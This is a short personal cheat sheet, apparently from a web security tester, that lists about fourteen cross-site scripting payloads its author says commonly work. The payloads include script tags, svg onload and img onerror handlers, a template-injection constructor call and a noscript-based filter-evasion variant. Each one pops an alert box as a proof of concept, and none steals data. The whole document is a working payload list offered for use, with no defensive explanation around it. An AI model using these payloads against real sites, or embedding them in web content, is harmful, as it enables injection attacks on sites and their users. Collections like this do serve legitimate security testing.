# Most common working payloads for me

```html
"><svg/onload=alert(1)>
"><script>alert(1)</script>
<div onmouseover="alert(document.domain);">
<IMG SRC="javascript:alert('XSS');">
</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
"><img src=x onerror=alert(1)>
{{constructor.constructor(`alert(1)`)()}}
<noscript><&amp;amp;amp;amp;lt; title=" &lt;/noscript&gt; &lt;img src= x onerror =alert(document.domain)//&quot;&gt;
"><div onmouseover="alert(1);">
<BODY onload=alert(1)>
<BASE HREF="javascript:alert('XSS');//">
"></iframe><script>alert(123)</script>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<svg onLoad=alert(document.domain)>
```

by <p style="color: #fa5448">Kira Reys</p>
